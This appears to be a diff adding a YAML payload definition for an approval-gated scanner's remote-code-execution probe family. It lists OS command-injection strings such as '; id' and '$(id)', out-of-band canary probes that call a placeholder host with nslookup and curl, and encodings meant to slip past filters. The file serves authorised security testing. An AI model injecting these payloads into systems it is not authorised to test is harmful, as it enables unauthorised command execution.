@@ -1,0 +1,57 @@
+family_id: rce
+description: >-
+  Remote Code Execution probes (OS-command injection contexts).
+  HIGH-risk family — operator approval is mandatory before the builder
+  emits a bundle. Seeds are conservative read-only commands ('id', 'whoami',
+  'echo {canary}'); destructive payloads must be authored by the operator
+  in a separate approved YAML.
+cwe_ids: [78, 77]
+owasp_top10:
+  - 'A03:2021'
+risk_level: high
+requires_approval: true
+oast_required: true
+payloads:
+  - id: id_unix
+    template: '; id'
+    confidence: likely
+    notes: Read-only Unix command-injection probe (semicolon separator).
+  - id: pipe_id
+    template: '| id'
+    confidence: likely
+    notes: Pipe variant for shell injection on filtered separators.
+  - id: subshell_id
+    template: '$(id)'
+    confidence: likely
+    notes: POSIX subshell expansion; differential output confirms execution.
+  - id: backtick_id
+    template: '`id`'
+    confidence: likely
+    notes: Backtick subshell; bypasses some $() denylists.
+  - id: ampersand_id
+    template: '& id'
+    confidence: suspected
+    notes: Ampersand backgrounding; useful when stdout is suppressed.
+  - id: oast_dns_canary
+    template: "; nslookup {canary}.{oast_host}"
+    confidence: confirmed
+    notes: DNS-canary OAST probe; collector confirms execution via callback.
+  - id: oast_curl_canary
+    template: '; curl -sSf http://{oast_host}/{canary} >/dev/null'
+    confidence: confirmed
+    notes: HTTP-canary OAST probe; only used when DNS variant fails.
+mutations:
+  - name: whitespace_alt
+    description: Alternative whitespace defeats simple space-banning filters.
+  - name: case_flip
+    description: Case flips for case-sensitive command name filters (rare on Unix).
+encodings:
+  - name: identity
+    stages: []
+    description: Raw payload (header-injection / form-input contexts).
+  - name: url_only
+    stages: [url]
+    description: URL-encoded; required for query-string sinks.
+  - name: url_double
+    stages: [url_double]
+    description: Double URL-encoded; bypasses one-pass-decoding gateways.
